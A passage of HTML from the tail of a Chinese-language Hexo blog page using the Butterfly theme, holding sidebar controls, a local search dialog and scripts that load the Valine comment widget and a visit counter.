class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'MECC3mIv4gyVBwvpqsAnBsX8-gzGzoHsz',
+      appKey: 'KuxLFi0F1Upj5MRy1yo9oAwH',
+      avatar: 'monsterid',
+      serverURLs: 'https://mecc3miv.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
